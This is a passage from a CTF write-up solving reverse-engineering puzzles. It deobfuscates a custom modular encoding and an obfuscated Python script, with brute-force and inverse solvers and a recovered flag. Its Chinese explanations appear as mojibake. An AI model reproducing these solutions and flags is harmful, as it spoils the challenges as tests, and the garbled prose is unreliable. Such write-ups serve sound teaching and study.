[rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(input, <span class="number">64</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fread(random, <span class="number">1uLL</span>, <span class="number">2uLL</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  num = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; input[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    n1 = ilproc(num, input[i]);</span><br><span class="line">    n2 = func0(n1, random[<span class="number">0</span>]);</span><br><span class="line">    num = func1(n2, random[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( i )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%zu&quot;</span>, num);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">output.txt:</span></span><br><span class="line"><span class="comment">816696039, 862511530, 897431439, 341060728, 173157153, 31974957, 491987052, 513290022, 463763452, 949994705, 910803499, 303483511, 378099927, 773435663, 305463445, 656532801, 655150297, 28357806, 69914739, 213536453, 962912446, 458779691, 598643891, 94970179, 732507398, 792930123, 216371336, 680163935, 397010125, 693248832, 926462193, 419350956, 594922380, 944019434, 93600641, 116339550, 373995190, 558908218, 700841647, 703877327, 665247438, 690373754, 35138387, 389900716, 625740467, 682452898, 894528752, 603308386, 442640217, 15961938, 573068354</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><code>/dev/urandom</code>æ˜¯Linuxç³»ç»Ÿçš„ä¸€ä¸ªéšæœºæ•°å‘ç”Ÿå™¨ ç¨‹åºä»é‡Œé¢å–äº†ä¸¤æ¬¡1byteæ•°æ®å­˜å…¥randomä¸­ ç”¨è¿™ä¸¤ä¸ª1byteéšæœºæ•°å¯¹flagè¿›è¡ŒåŠ å¯† å¤„ç†å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">add</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 high; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( high = <span class="number">1LL</span>; (high &amp; a1) != <span class="number">0</span>; high *= <span class="number">2LL</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">for</span> ( i = high | a1; ; i &amp;= ~high )</span><br><span class="line">  &#123;</span><br><span class="line">    high &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !high )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">ilproc</span><span class="params">(<span class="type">unsigned</span> __int64 num1, <span class="type">unsigned</span> __int64 num2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 count; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( count = <span class="number">0LL</span>; count &lt; num2; count = add(count) )</span><br><span class="line">    num1 = add(num1);</span><br><span class="line">  <span class="keyword">return</span> num1 % mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">process</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int64 num,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int64 random,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int64 _1,</span></span><br><span class="line"><span class="params">        __int64 (__fastcall *ilproc)(<span class="type">unsigned</span> __int64, <span class="type">unsigned</span> __int64))</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( random )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (random &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      _1 = ilproc(_1, num) % mod;</span><br><span class="line">    num = ilproc(num, num) % mod;               <span class="comment">// 0x3B9ACA07</span></span><br><span class="line">    random &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">func0</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> process(a1, a2, <span class="number">0LL</span>, ilproc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">func1</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">unsigned</span> __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> process(a1, a2, <span class="number">1uLL</span>, func0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¯”è¾ƒæœ‰è¿·æƒ‘æ€§çš„æ˜¯<code>add(arg)</code>å‡½æ•°(å·²é‡å‘½å) å®é™…ä¸Šå°±æ˜¯<code>lambda arg:arg + 1</code> å‰©ä¸‹çš„éš¾ç‚¹å°±æ˜¯æ‰¾åˆ°è¿™ä¸¤ä¸ªéšæœºæ•° å¥½åœ¨å®ƒä»¬çš„é•¿åº¦åªæœ‰1byte ç›´æ¥çˆ†ç ´å³å¯:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mod = <span class="number">0x3B9ACA07</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> enc[] = &#123;<span class="number">816696039</span>, <span class="number">862511530</span>, <span class="number">897431439</span>, <span class="number">341060728</span>, <span class="number">173157153</span>, <span class="number">31974957</span>, <span class="number">491987052</span>, <span class="number">513290022</span>, <span class="number">463763452</span>, <span class="number">949994705</span>, <span class="number">910803499</span>, <span class="number">303483511</span>, <span class="number">378099927</span>, <span class="number">773435663</span>, <span class="number">305463445</span>, <span class="number">656532801</span>, <span class="number">655150297</span>, <span class="number">28357806</span>, <span class="number">69914739</span>, <span class="number">213536453</span>, <span class="number">962912446</span>, <span class="number">458779691</span>, <span class="number">598643891</span>, <span class="number">94970179</span>, <span class="number">732507398</span>, <span class="number">792930123</span>, <span class="number">216371336</span>, <span class="number">680163935</span>, <span class="number">397010125</span>, <span class="number">693248832</span>, <span class="number">926462193</span>, <span class="number">419350956</span>, <span class="number">594922380</span>, <span class="number">944019434</span>, <span class="number">93600641</span>, <span class="number">116339550</span>, <span class="number">373995190</span>, <span class="number">558908218</span>, <span class="number">700841647</span>, <span class="number">703877327</span>, <span class="number">665247438</span>, <span class="number">690373754</span>, <span class="number">35138387</span>, <span class="number">389900716</span>, <span class="number">625740467</span>, <span class="number">682452898</span>, <span class="number">894528752</span>, <span class="number">603308386</span>, <span class="number">442640217</span>, <span class="number">15961938</span>, <span class="number">573068354</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">copy funcs here...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> check[<span class="number">8</span>];</span><br><span class="line">    <span class="comment">// memcpy(check, &quot;amateurs&quot;, 8);</span></span><br><span class="line">    <span class="comment">// for(unsigned int i = 0; i &lt;= 0xFF; i++)&#123;</span></span><br><span class="line">    <span class="comment">//     for(unsigned int j = 0; j &lt;= 0xFF; j++)&#123;</span></span><br><span class="line">    <span class="comment">//         unsigned int num = 0, n1 = 0, n2 = 0, f = 0;</span></span><br><span class="line">    <span class="comment">//         for(int c = 0; c &lt; 8; c++)&#123;</span></span><br><span class="line">    <span class="comment">//             n1 = ilproc(num, check[c]);</span></span><br><span class="line">    <span class="comment">//             n2 = func0(n1, i);</span></span><br><span class="line">    <span class="comment">//             num = func1(n2, j);</span></span><br><span class="line">    <span class="comment">//             if(num == enc[c])&#123;</span></span><br><span class="line">    <span class="comment">//                 f++;</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">    <span class="comment">//             else&#123;</span></span><br><span class="line">    <span class="comment">//                 break;</span></span><br><span class="line">    <span class="comment">//             &#125;</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//         if(f == 8)&#123;</span></span><br><span class="line">    <span class="comment">//             printf(&quot;Key: 0x%x, 0x%x\n&quot;, i, j);</span></span><br><span class="line">    <span class="comment">//             return 0;</span></span><br><span class="line">    <span class="comment">//         &#125;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="type">int</span> key[<span class="number">2</span>] = &#123;<span class="number">0xed</span>, <span class="number">0x29</span>&#125;;</span><br><span class="line">    <span class="built_in">string</span> flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> num = <span class="number">0</span>, n1 = <span class="number">0</span>, n2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> c = <span class="number">0</span>; c &lt; <span class="number">51</span>; c++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> chr = <span class="number">0</span>; chr &lt;= <span class="string">&#x27;&#125;&#x27;</span>; chr++)&#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> numtmp = num, n1tmp = n1, n2tmp = n2;</span><br><span class="line">          n1tmp = ilproc(num, chr);</span><br><span class="line">          n2tmp = func0(n1tmp, key[<span class="number">0</span>]);</span><br><span class="line">          numtmp = func1(n2tmp, key[<span class="number">1</span>]);</span><br><span class="line">          <span class="keyword">if</span>(numtmp == enc[c])&#123;</span><br><span class="line">              flag += (<span class="type">char</span>)chr;</span><br><span class="line">              num = numtmp;</span><br><span class="line">              n1 = n1tmp;</span><br><span class="line">              n2 = n2tmp;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; flag &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// amateursCTF&#123;r/programminghorror/comments/18x7vk9/&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="typo-pyre"><a href="#typo-pyre" class="headerlink" title="typo | pyre"></a>typo | pyre</h2><p>é¢˜ç›®ç›´æ¥ç»™äº†ä¸€ä¸ªæ··æ·†å˜é‡åå’Œå‡½æ•°åçš„<code>.py</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> RrRrRrrrRrRRrrRRrRRrrRr</span><br><span class="line">RrRrRrrrRrRRrrRRrRRrRrr = <span class="built_in">int</span>(<span class="string">&#x27;1665663c&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">RrRrRrrrRrRRrrRRrRRrrRr.seed(RrRrRrrrRrRRrrRRrRRrRrr)</span><br><span class="line">arRRrrRRrRRrRRRrRrRRrRr = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">arRRrrRrrRRrRRRrRrRRrRr = <span class="string">&#x27;\r&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">r&#x27;r\\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;rr\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;r\\&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r\\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">&#x27;\rr&#x27;</span></span><br><span class="line">arRRrrRRrRRrRrRrRrRRrRr = [</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;aRrRrrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRRrRrrRRrRR&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRrRrRrRRRrrRrrrR&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">arRRRrRRrRRrRRRrRrRRrRr = <span class="keyword">lambda</span> aRrRrRrrrRrRRrrRRrRrrRr: <span class="built_in">bytearray</span>([arRrrrRRrRRrRRRrRrRrrRr + <span class="number">1</span> <span class="keyword">for</span> arRrrrRRrRRrRRRrRrRrrRr <span class="keyword">in</span> aRrRrRrrrRrRRrrRRrRrrRr])</span><br><span class="line">arRRrrRRrRRrRRRrRrRrrRr = <span class="keyword">lambda</span> aRrRrRrrrRrRRrrRRrRrrRr: <span class="built_in">bytearray</span>([arRrrrRRrRRrRRRrRrRrrRr - <span class="number">1</span> <span class="keyword">for</span> arRrrrRRrRRrRRRrRrRrrRr <span class="keyword">in</span> aRrRrRrrrRrRRrrRRrRrrRr])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arRRrrRRrRRrRrRRrRrrRrRr</span>(<span class="params"><span class="built_in">hex</span></span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">id</span>], <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">id</span>]</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">list</span>], <span class="built_in">hex</span>[<span class="built_in">list</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">list</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">list</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span></span><br><span class="line">arRRRRRRrRRrRRRrRrRrrRr = [arRRrrRRrRRrRrRRrRrrRrRr, arRRRrRRrRRrRRRrRrRRrRr, arRRrrRRrRRrRRRrRrRrrRr]</span><br><span class="line">arRRRRRRrRRrRRRrRrRrrRr = [RrRrRrrrRrRRrrRRrRRrrRr.choice(arRRRRRRrRRrRRRrRrRrrRr) <span class="keyword">for</span> arRrrrRRrRRrRRRrRrRrrRr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RrRrRrrrRrRRrrRRrRRrrRr</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> ar:</span><br><span class="line">        arr = arRRRRRRrRRrRRRrRrRrrRr[r](arr)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arRRrrRRrRRrRrRRrRrrRrRr</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    ar = <span class="built_in">int</span>(ar.<span class="built_in">hex</span>(), <span class="number">17</span>)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> arr:</span><br><span class="line">        ar += <span class="built_in">int</span>(r, <span class="number">35</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(ar)[<span class="number">2</span>:])</span><br><span class="line">arrRRrrrrRRrRRRrRrRRRRr = RrRrRrrrRrRRrrRRrRRrrRr(arRRrrRRrRRrRRRrRrRRrRr, arRRrrRrrRRrRRRrRrRRrRr.encode())</span><br><span class="line">arrRRrrrrRRrRRRrRrRRRRr = arRRrrRRrRRrRrRRrRrrRrRr(arRRrrRRrRRrRrRrRrRRrRr, arrRRrrrrRRrRRRrRrRRRRr)</span><br><span class="line"><span class="built_in">print</span>(arrRRrrrrRRrRRRrRrRRRRr.<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># 5915f8ba06db0a50aa2f3eee4baef82e70be1a9ac80cb59e5b9cb15a15a7f7246604a5e456ad5324167411480f893f97e3</span></span><br></pre></td></tr></table></figure>

<p>æ”¹ä¸€ä¸‹å˜é‡å’Œå‡½æ•°åç¨‹åºçš„é€»è¾‘å°±å¾ˆæ¸…æ™°äº†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> rand</span><br><span class="line">data1 = <span class="built_in">int</span>(<span class="string">&#x27;1665663c&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">rand.seed(data1)</span><br><span class="line">data2 = <span class="built_in">bytearray</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">data3 = <span class="string">&#x27;\r&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">r&#x27;r\\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;rr\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;r\\&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r\\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">&#x27;\rr&#x27;</span></span><br><span class="line">data4 = [</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;aRrRrrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRRrRrrRRrRR&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRrRrRrRRRrrRrrrR&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">lam1 = <span class="keyword">lambda</span> arg: <span class="built_in">bytearray</span>([each + <span class="number">1</span> <span class="keyword">for</span> each <span class="keyword">in</span> arg])</span><br><span class="line">lam2 = <span class="keyword">lambda</span> arg: <span class="built_in">bytearray</span>([each - <span class="number">1</span> <span class="keyword">for</span> each <span class="keyword">in</span> arg])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params"><span class="built_in">hex</span></span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">id</span>], <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">id</span>]</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">list</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">list</span>], <span class="built_in">hex</span>[<span class="built_in">list</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">list</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">list</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span></span><br><span class="line">func_table = [func1, lam1, lam2]</span><br><span class="line">func_table = [rand.choice(func_table) <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rand</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> ar:</span><br><span class="line">        arr = func_table[r](arr)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    ar = <span class="built_in">int</span>(ar.<span class="built_in">hex</span>(), <span class="number">17</span>)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> arr:</span><br><span class="line">        ar += <span class="built_in">int</span>(r, <span class="number">35</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(ar)[<span class="number">2</span>:])</span><br><span class="line">result = rand(data2, data3.encode())</span><br><span class="line">result = func1(data4, result)</span><br><span class="line"><span class="built_in">print</span>(result.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>ç”¨ä¸€ä¸ªéšæœºçš„å‡½æ•°è¡¨æ¥å¯¹flagè¿›è¡Œæ“ä½œç„¶åBase16 -&gt; Base17 æ¯ä¸€ä¸ªæ“ä½œéƒ½æ˜¯å¯é€†çš„ åªéœ€è¦æŠŠå®ƒä»¬å†™æˆé€†æ“ä½œå†é€†åºæ‰§è¡ŒåŠ å¯†æ—¶çš„å‡½æ•°å°±èƒ½é€†å‘æ•´ä¸ªåŠ å¯†è¿‡ç¨‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random <span class="keyword">as</span> rd</span><br><span class="line">seed = <span class="built_in">int</span>(<span class="string">&#x27;1665663c&#x27;</span>, <span class="number">20</span>)</span><br><span class="line">rd.seed(seed)</span><br><span class="line">flag1 = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;0x5915f8ba06db0a50aa2f3eee4baef82e70be1a9ac80cb59e5b9cb15a15a7f7246604a5e456ad5324167411480f893f97e3&quot;</span>[<span class="number">2</span>:])</span><br><span class="line">data1 = <span class="string">&#x27;\r&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">r&#x27;r\\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;\\r\r&#x27;</span><span class="string">r&#x27;r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;\\r&#x27;</span><span class="string">r&#x27;rr\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r&#x27;</span><span class="string">&#x27;r\\&#x27;</span><span class="string">r&#x27;\r&#x27;</span><span class="string">&#x27;\r&#x27;</span><span class="string">&#x27;r\\\r&#x27;</span><span class="string">r&#x27;r\r&#x27;</span><span class="string">&#x27;\rr&#x27;</span></span><br><span class="line">data2 = [</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;aRrRrrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrRRrRrrRRrRR&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;arRRrrRRrRRRrRr&#x27;</span></span><br><span class="line">    <span class="string">b&#x27;arRrRrRrRRRrrRrrrR&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">func1 = <span class="keyword">lambda</span> arg: <span class="built_in">bytearray</span>([(each - <span class="number">1</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> each <span class="keyword">in</span> arg])</span><br><span class="line">func2 = <span class="keyword">lambda</span> arg: <span class="built_in">bytearray</span>([(each + <span class="number">1</span>) &amp; <span class="number">0xff</span> <span class="keyword">for</span> each <span class="keyword">in</span> arg])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func3</span>(<span class="params"><span class="built_in">hex</span></span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">id</span>], <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">id</span>]</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">hex</span>) - <span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="built_in">hex</span>[<span class="built_in">id</span>], <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>] = <span class="built_in">hex</span>[<span class="built_in">id</span> + <span class="number">1</span>], <span class="built_in">hex</span>[<span class="built_in">id</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span></span><br><span class="line">result = [func3, func1, func2]</span><br><span class="line">result = [rd.choice(result) <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rd</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> ar[::-<span class="number">1</span>]:</span><br><span class="line">        arr = result[r](arr)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func4</span>(<span class="params">arr, ar</span>):</span><br><span class="line">    ar = <span class="built_in">int</span>(ar.<span class="built_in">hex</span>(), <span 